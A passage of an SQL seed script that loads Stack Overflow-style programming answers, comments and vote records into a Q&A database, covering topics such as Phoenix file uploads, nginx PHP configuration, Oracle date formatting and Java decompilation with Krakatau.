&lt;pre&gt;&lt;code&gt;L &amp;lt;- list(data.frame(Var=&#x27;&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;&#x27;),data.frame(Var=&#x27;&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;&#x27;))

K &amp;lt;- lapply(L,function(df) as.numeric(gsub(&#x27;&quot;&#x27;,&#x27;&#x27;,unlist(strsplit(as.character(df[1,1]),&#x27;,&#x27;)))))
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (43, 24, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (43, 36, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (44, 49, '&lt;p&gt;Working fine for me. Hope this will work for you as well.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;location ~\.php$ {
    index index.php index.html;
    include fastcgi_params;
    fastcgi_pass unix:/var/run/php5-fpm.sock;
    fastcgi_index index.php;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    try_files /index.php /index.php;
}
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (44, 26, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (44, 49, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (44, 49, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (45, 5, '&lt;p&gt;Maybe something like this (javascript):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jQuery(&#x27;.addtocart&#x27;).each(function() {
    var $self = jQuery(this),
        oldOnClick = $self.attr(&#x27;onclick&#x27;),
        $product = $self.closest(&#x27;.product-info&#x27;);

    $self.removeAttr(&#x27;onclick&#x27;);
    $self.off(&#x27;click&#x27;).on(&#x27;click&#x27;, function() {
        if($product.find(&#x27;.input-text.qty&#x27;).value &amp;lt; 1)
            return false;
        else
            eval(oldOnClick);
    });
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When user clicks on &#x27;add to cart&#x27;, check if the quantity value is &gt;= 1.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (45, 29, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (45, 5, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 5, 3);
INSERT INTO postinstance (post_id, user_id, description) VALUES (46, 13, '&lt;p&gt;First of all there are two different options:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;You can store your uploads locally&lt;/li&gt;
&lt;li&gt;You can store them on external services, such as Amazon S3&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Choosing the right option heavily depends on your business logic, number of users and requests and your deploying strategy (for example Heroku does not allow to store uploaded files on their dynos).&lt;/p&gt;

&lt;h2&gt;Locally&lt;/h2&gt;

&lt;p&gt;So, the way store files locally is described in &lt;a href=&quot;http://smashingboxes.com/blog/image-upload-in-phoenix&quot; rel=&quot;nofollow noreferrer&quot;&gt;this article&lt;/a&gt;. The short answer is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# lib/my_app/endpoint.ex

plug Plug.Static,
  at: &quot;/uploads&quot;, from: Path.expand(&quot;./uploads&quot;), gzip: false 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;Amazon&lt;/h2&gt;

&lt;p&gt;When dealing with Amazon S3, you would still use &lt;code&gt;arc&lt;/code&gt; and the basic setup will remain the same as in the article above, but things are just slightly different and requires to reconfigure your application for a little bit:&lt;/p&gt;

&lt;p&gt;Add &lt;code&gt;{:ex_aws, &quot;~&amp;gt; 0.4&quot;},&lt;/code&gt; to deps.
And add to the config:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;config :arc,
  bucket: &quot;your-bucket&quot;,
  virtual_host: true

config :ex_aws,
  access_key_id: System.get_env(&quot;AWS_ACCESS_KEY_ID&quot;),
  secret_access_key: System.get_env(&quot;AWS_SECRET_ACCESS_KEY&quot;),
  s3: [
    scheme: &quot;https://&quot;,
    host: &quot;your-region.amazonaws.com&quot;,
    region: &quot;your-region&quot;
  ]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&#x27;s basically it. See &lt;a href=&quot;https://github.com/CargoSense/ex_aws#getting-started&quot; rel=&quot;nofollow noreferrer&quot;&gt;full installation instructions&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;P.S. Quite strange that &lt;a href=&quot;http://www.phoenixframework.org/docs/file-uploads&quot; rel=&quot;nofollow noreferrer&quot;&gt;official docs&lt;/a&gt; don&#x27;t cover this topic, I guess it could be improved. &lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (46, 30, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (46, 13, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (46, 13, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (46, 13, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (46, 13, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (46, 13, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (46, 13, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (46, 13, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (46, 13, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (46, 13, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', -4, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (47, 39, '&lt;p&gt;list-style:none; is wrong *ts: list-style-type: none; Beside of this i havent understood your problem. Can you be more precise please?&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (47, 11, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (47, 39, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (48, 36, '&lt;pre&gt;&lt;code&gt;$response = json_decode($response, true);

$filtered[&#x27;metafields&#x27;] = array_filter($response[&#x27;metafields&#x27;], function ($item) {
   return $item[&#x27;namespace&#x27;] === &#x27;global&#x27;; 
});

var_dump($filtered);

array(1) {
  [&quot;metafields&quot;]=&amp;gt;
  array(2) {
    [0]=&amp;gt;
    array(2) {
      [&quot;id&quot;]=&amp;gt;
      int(30007223558)
      [&quot;namespace&quot;]=&amp;gt;
      string(6) &quot;global&quot;
    }
    [2]=&amp;gt;
    array(2) {
      [&quot;id&quot;]=&amp;gt;
      int(154644565)
      [&quot;namespace&quot;]=&amp;gt;
      string(6) &quot;global&quot;
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (48, 18, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (48, 36, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', -2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (49, 28, '&lt;p&gt;You already know how to iterate over the 2D array. Just put a &lt;code&gt;if&lt;/code&gt; clause within the inner loop with your condition and call &lt;code&gt;print&lt;/code&gt; with the indexes &lt;code&gt;i&lt;/code&gt; and &lt;code&gt;j&lt;/code&gt;&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (49, 9, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (49, 28, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (50, 21, '&lt;p&gt;Restart the service when it&#x27;s stopped i.e. System will call onDestroy() on service which is stopped.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (50, 15, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (50, 21, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (51, 41, '&lt;p&gt;Here is what I did.&lt;/p&gt;

&lt;p&gt;I found that there is a &quot;clicked&quot; property on  that prompt an intellisense dropdown with a &quot;new event handler&quot;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;StackLayout
        VerticalOptions=&quot;CenterAndExpand&quot;&amp;gt;
        &amp;lt;Entry StyleId=&quot;UsernameEntry&quot;
               Placeholder=&quot;Username&quot;
               Text=&quot;{Binding Username}&quot; /&amp;gt;
        &amp;lt;Entry StyleId=&quot;PasswordEntry&quot;
               Placeholder=&quot;password&quot;
               Text=&quot;{Binding Password}&quot; /&amp;gt;
        &amp;lt;Button 
            StyleId=&quot;btn_connexion&quot;
            Text=&quot;Connexion&quot;
            Clicked=&quot;connexion&quot; /&amp;gt;
        &amp;lt;Button 
            StyleId=&quot;btn_testSecondView&quot;
            Text=&quot;Test 2nd View&quot;
                Clicked=&quot;SecondView_Click&quot;&amp;gt;&amp;lt;/Button&amp;gt;
    &amp;lt;/StackLayout&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once i did that it created a method in the code behind &quot;Login.xaml.cs&quot;.&lt;/p&gt;

&lt;p&gt;From there I just paste the navigation method and it worked&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;private async Task SecondView_Click()
        {
            App.Current.MainPage = new NavigationPage(new SecondView());
        }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The fact that it is a PCL project makes it difficult to find the right information because everything you find on the internet concerns the ios/android solution and not the portable solution.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (51, 14, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (51, 41, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (52, 44, '&lt;pre&gt;&lt;code&gt;$.ajax({
    url: &quot;120.58.243.11:8080/needCal/myJson.json&quot;, 
    dataType:&#x27;json&#x27;,
    success: function(data){
    var items = [];

    var totalOfValue = 0;
    $.each(data,function(key,value){  
        totalOfValue = totalOfValue + parseInt(value.value);
    });

    $.each(data,function(key,value){  
        items.push(&quot;&amp;lt;tr&amp;gt;&quot;);
        items.push(&quot;&amp;lt;td id=&#x27;&quot; +key+ &quot;&#x27;&amp;gt;&quot; + value.value+&amp;lt;/td&amp;gt;&quot;);
        items.push(&quot;&amp;lt;td id=&#x27;&quot; +key+ &quot;&#x27;&amp;gt;&quot; + totalOfValue +&amp;lt;/td&amp;gt;&quot;); 
        items.push(&quot;&amp;lt;/tr&amp;gt;&quot;);
    });
    }
   }
);
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (52, 21, 'True');
INSERT INTO activity ( post_id, user_id, action) VALUES (52, 44, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (53, 49, '&lt;p&gt;Ok, conceptual excercise coming up&lt;/p&gt;

&lt;p&gt;Which of these dates represents the 1st January 2017?&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;01/01/2017
2017-01-01
01-JAN-2017
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&#x27;s right, all of them. The date datatype is not a format, it stores the value of the date, not how it appears.&lt;/p&gt;

&lt;p&gt;If using Oracle, adjust your NLS_DATE_FORMAT to match your expectation, but again, this is just how the system will &lt;em&gt;display&lt;/em&gt; the date, not how it stores it.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (53, 1, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (53, 49, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (53, 49, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (54, 26, '&lt;p&gt;What you are doing with the &lt;code&gt;to_date&lt;/code&gt; method is parsing the string into a date object. If you then want to output the date object as string with a different format you should use the &lt;code&gt;to_char&lt;/code&gt; method. &lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SELECT to_char(
    to_date(&#x27;29/03/17 14:05&#x27;,&#x27;DD/MM/RR HH24:MI&#x27;), 
    &#x27;DD/MM/RR HH24:MI&#x27;
) FROM dual;
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (54, 1, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (54, 26, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 3, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (55, 40, '&lt;p&gt;Add this to &lt;strong&gt;app/lib/app/endpoint.ex&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;plug Plug.Static,
  at: &quot;files/&quot;, from: &quot;/var/www/app/files/&quot;, gzip: false
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and store the uploaded files at &lt;code&gt;/var/www/app/files/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The files will be served at &lt;strong&gt;&lt;a href=&quot;http://localhost:PORT/files/&quot; rel=&quot;nofollow&quot;&gt;http://localhost:PORT/files/&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;You can learn more at &lt;a href=&quot;https://hexdocs.pm/plug/Plug.Static.html&quot; rel=&quot;nofollow&quot;&gt;https://hexdocs.pm/plug/Plug.Static.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Also, using something like nginx to serve the files in production environment may be a better option depending on your requirements.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (55, 30, 'True');
INSERT INTO activity ( post_id, user_id, action) VALUES (55, 40, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (55, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (55, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (55, 40, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 1);
INSERT INTO postinstance (post_id, user_id, description) VALUES (56, 48, '&lt;p&gt;The easiest and normal way to decompile with Krakatau is to decompile a jar.&lt;/p&gt;

&lt;p&gt;Say you have a jar file named &lt;code&gt;Luyten.jar&lt;/code&gt; in the current directory and you want to decompile every class in the jar and output it to the directory &lt;code&gt;temp&lt;/code&gt;. Then you&#x27;d do something like&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pypy -O Krakatau\decompile.py -skip -out temp Luyten.jar
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Depending on whether you have JDK installed and where, you may need to explicitly pass the location of the jre in the path argument. For example&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pypy -O Krakatau\decompile.py -skip -out temp -path &quot;C:\Program Files (x86)\Java\jre7\lib\rt.jar&quot; Luyten.jar
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you want to decompile a specific class within the jar, you can add the jar to the path and specify the classname. If you need to specify a path to rt.jar as in the previous example, you can pass the &lt;code&gt;-path&lt;/code&gt; argument multiple times or a single time separated by semicolons. For example to decompile only the class com.beust.jcommander.FuzzyMap$IKey,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pypy -O Krakatau\decompile.py -skip -out temp -path Luyten.jar com.beust.jcommander.FuzzyMap$IKey
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can also decompile classfiles that are outside of a jar, but it&#x27;s a lot more annoying, because you have to make sure the directory layout is correct. You need to specify the directory that is the root relative to where the classes will be found. &lt;/p&gt;

&lt;p&gt;For example, suppose you have a classfile located at ./Foo/Bar/com/beust/jcommander/FuzzyMap$IKey.class&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pypy -O Krakatau\decompile.py -skip -out temp -path Foo/Bar com.beust.jcommander.FuzzyMap$IKey
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In this case, the directory has to match the fully qualified classname exactly. A common mistake is to try to decompile with the wrong root directory. The nice thing about jars is that having the correct directory structure is automatic.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (56, 22, 'True');
INSERT INTO activity ( post_id, user_id, action) VALUES (56, 48, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (56, 48, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (56, 48, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (56, 48, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Deleted', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (57, 21, '&lt;a href=&quot;https://developer.mozilla.org/en/docs/Web/CSS/list-style&quot; rel=&quot;nofollow noreferrer&quot;&gt;ahem&lt;/a&gt;');
INSERT INTO answercomment (post_id, answer_id) VALUES (57, 47);
INSERT INTO activity (post_id, user_id, action) VALUES (57, 21, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (58, 24, 'This worked like a charm except that it introduced a fifth &lt;code&gt;NA&lt;/code&gt; element in all of the vectors. Any idea why?');
INSERT INTO answercomment (post_id, answer_id) VALUES (58, 43);
INSERT INTO activity (post_id, user_id, action) VALUES (58, 24, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (59, 16, 'Exactly @AndyHolmes');
INSERT INTO answercomment (post_id, answer_id) VALUES (59, 37);
INSERT INTO activity (post_id, user_id, action) VALUES (59, 16, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (60, 18, 'This will affect any page that uses the Bootstrap &lt;code&gt;.row&lt;/code&gt; class');
INSERT INTO answercomment (post_id, answer_id) VALUES (60, 37);
INSERT INTO activity (post_id, user_id, action) VALUES (60, 18, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (61, 12, 'Not really an answer then is it');
INSERT INTO answercomment (post_id, answer_id) VALUES (61, 47);
INSERT INTO activity (post_id, user_id, action) VALUES (61, 12, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (61, 12, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (62, 14, 'you shouldn&amp;#39;t really do people&amp;#39;s homework. We are not here to save them a couple of keystrokes. These kind of answers bring along downvotes, even though they are correct.');
INSERT INTO answercomment (post_id, answer_id) VALUES (62, 49);
INSERT INTO activity (post_id, user_id, action) VALUES (62, 14, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (63, 32, 'By default, endpoint.ex specifies &lt;code&gt;plug Plug.static, at: &amp;quot;&amp;#47;&amp;quot;, from: :app_name&lt;/code&gt;. In dev, this makes it easy to write files to &lt;code&gt;.&amp;#47;web&amp;#47;static&amp;#47;filename.png&lt;/code&gt; and they get copied into &lt;code&gt;priv&amp;#47;static&lt;/code&gt; by brunch and served. Can Phoenix save files on a relative path in production where they&amp;#39;ll get served? If so, how?');
INSERT INTO answercomment (post_id, answer_id) VALUES (63, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (63, 32, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (64, 6, '@Omin How do you handle the creation of the &lt;code&gt;&amp;#47;var&amp;#47;www&amp;#47;app&amp;#47;files&amp;#47;&lt;/code&gt; directory, and do you have to configure special privileges for phoenix? I am having difficulty in understanding just where to create the folder...in my vm when deployed? Somewhere in the Phoenix project? I have very little knowledge about deployment yet.');
INSERT INTO answercomment (post_id, answer_id) VALUES (64, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (64, 6, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (65, 33, '@ibgib Updated! Thanks.');
INSERT INTO answercomment (post_id, answer_id) VALUES (65, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (65, 33, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (65, 33, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (66, 2, '@Omin The &lt;code&gt;plug Plug.Static&lt;/code&gt; needs a comma: &lt;code&gt;plug Plug.Static,&lt;/code&gt;');
INSERT INTO answercomment (post_id, answer_id) VALUES (66, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (66, 2, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 4, 3);
INSERT INTO postinstance (post_id, user_id, description) VALUES (67, 26, 'Your endpoint and your router helpers have static_path and static_url functions which you could use for this case.');
INSERT INTO answercomment (post_id, answer_id) VALUES (67, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (67, 26, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (67, 26, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (67, 26, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (67, 26, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (67, 26, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (67, 26, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (67, 26, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (67, 26, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (68, 6, '&lt;code&gt;You can add the path to your configurations if you don&amp;#39;t want to want&lt;/code&gt; -- yes, but that be a repetition in code. In Rails we have a function &amp;quot;asset_path(&amp;#39;image1.png&amp;#39;)&amp;quot;. Is there anything similar in Phoenix?');
INSERT INTO answercomment (post_id, answer_id) VALUES (68, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (68, 6, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (69, 8, 'The question is, what that function really is. Does it exist?');
INSERT INTO answercomment (post_id, answer_id) VALUES (69, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (69, 8, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (70, 29, 'I&amp;#39;m not sure what you&amp;#39;re asking. You can add the path to your configurations if you don&amp;#39;t want to want to type it out in your controller.');
INSERT INTO answercomment (post_id, answer_id) VALUES (70, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (70, 29, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (71, 24, 'I thought I was already being clear. Your &lt;code&gt;get_uploaded_image_url(&amp;quot;image1.png&amp;quot;)&lt;/code&gt; would either return &lt;code&gt;localhost:4000&amp;#47;files&amp;#47;image.png&lt;/code&gt; or &lt;code&gt;&amp;#47;var&amp;#47;www&amp;#47;app&amp;#47;files&amp;#47;image1.png&lt;/code&gt; depending on your requirements.');
INSERT INTO answercomment (post_id, answer_id) VALUES (71, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (71, 24, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (72, 39, 'I know. My question is &amp;quot;can I actually get the path of a certain image in a) view (html) b) controller? &amp;quot; That is, I&amp;#39;d not like to hardcode &amp;quot;files/&amp;quot; in a controller or view, I want to do something like &lt;code&gt;get_uploaded_image_url(&amp;quot;image1.png&amp;quot;)&lt;/code&gt; which would return a full url of an image');
INSERT INTO answercomment (post_id, answer_id) VALUES (72, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (72, 39, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (72, 39, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (73, 42, 'Only uploaded images will be stored there. You already have default configuration for &lt;b&gt;Plug.Static&lt;/b&gt; for real static files which is generated by Phoenix Framework.');
INSERT INTO answercomment (post_id, answer_id) VALUES (73, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (73, 42, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (74, 34, 'I mentioned that the files (images) will be served at &lt;b&gt;localhost/files/&lt;/b&gt;.  e.g. If you were using port &lt;b&gt;4000&lt;/b&gt; and had an image called &lt;b&gt;image.png&lt;/b&gt;, I&amp;#39;ll be available at &lt;b&gt;localhost:4000/files/image.png&lt;/b&gt; if you followed my instructions.');
INSERT INTO answercomment (post_id, answer_id) VALUES (74, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (74, 34, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Deleted', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (75, 12, 'also Static implies that all images will be stored in &lt;code&gt;&amp;quot;&amp;#47;var&amp;#47;www&amp;#47;app&amp;#47;files&amp;#47;&amp;quot;&lt;/code&gt;. But I want only uploaded images to be stored there, static ones should be stored in a default location. Is it possible to do?');
INSERT INTO answercomment (post_id, answer_id) VALUES (75, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (75, 12, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (75, 12, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (76, 36, 'ok, but how can I actually get the path of a certain image in a) view (html) b) controller?');
INSERT INTO answercomment (post_id, answer_id) VALUES (76, 55);
INSERT INTO activity (post_id, user_id, action) VALUES (76, 36, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (77, 10, 'There are many valid reasons not to use an additional library/package. My reason is that I don&amp;#39;t want to add another layer of complexity for maintainability.');
INSERT INTO answercomment (post_id, answer_id) VALUES (77, 46);
INSERT INTO activity (post_id, user_id, action) VALUES (77, 10, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (78, 49, 'I don&amp;#39;t see any reason not to use it, it is totally posible to store files locally. here&amp;#39;s the source code for the local adapter in &lt;code&gt;arc&lt;/code&gt;: &lt;a href=&quot;https://github.com/stavro/arc/blob/master/lib/arc/storage/local.ex&quot; rel=&quot;nofollow noreferrer&quot;&gt;github.com/stavro/arc/blob/master/lib/arc/storage/local.ex&lt;/a&gt;');
INSERT INTO answercomment (post_id, answer_id) VALUES (78, 46);
INSERT INTO activity (post_id, user_id, action) VALUES (78, 49, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (79, 46, 'you don&amp;#39;t understand. I don&amp;#39;t want to use arc because there&amp;#39;s no need to use it because I want to upload and save files &lt;b&gt;locally&lt;/b&gt;.');
INSERT INTO answercomment (post_id, answer_id) VALUES (79, 46);
INSERT INTO activity (post_id, user_id, action) VALUES (79, 46, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (80, 46, '@Johshi It really does not matter for &lt;code&gt;arc&lt;/code&gt; what provider would you use, so the url generation will remain the same: &lt;code&gt;YourDefinition.url({model.avatar, model})&lt;/code&gt;');
INSERT INTO answercomment (post_id, answer_id) VALUES (80, 46);
INSERT INTO activity (post_id, user_id, action) VALUES (80, 46, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (81, 31, 'sorry, by &amp;quot;how can I get a path/url of an image from a) controller b) view?&amp;quot; I meant how to do that for an image in localhost.');
INSERT INTO answercomment (post_id, answer_id) VALUES (81, 46);
INSERT INTO activity (post_id, user_id, action) VALUES (81, 31, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (82, 12, 'but it then will be included in the compiled beam fie?');
INSERT INTO answercomment (post_id, answer_id) VALUES (82, 46);
INSERT INTO activity (post_id, user_id, action) VALUES (82, 12, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (83, 15, 'yes, the root folder is the place and no, only paths specified in &lt;code&gt;defp elixirc_paths(_),     do: [&amp;quot;lib&amp;quot;, &amp;quot;web&amp;quot;]&lt;/code&gt; go to &lt;code&gt;_build&lt;/code&gt;.');
INSERT INTO answercomment (post_id, answer_id) VALUES (83, 46);
INSERT INTO activity (post_id, user_id, action) VALUES (83, 15, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (84, 3, 'where should &amp;quot;/uploads&amp;quot; be located, in the root of the project? if so, won&amp;#39;t it be included into the output release generated file - I don&amp;#39;t know what it&amp;#39;s called - when deploying?');
INSERT INTO answercomment (post_id, answer_id) VALUES (84, 46);
INSERT INTO activity (post_id, user_id, action) VALUES (84, 3, 'Create');

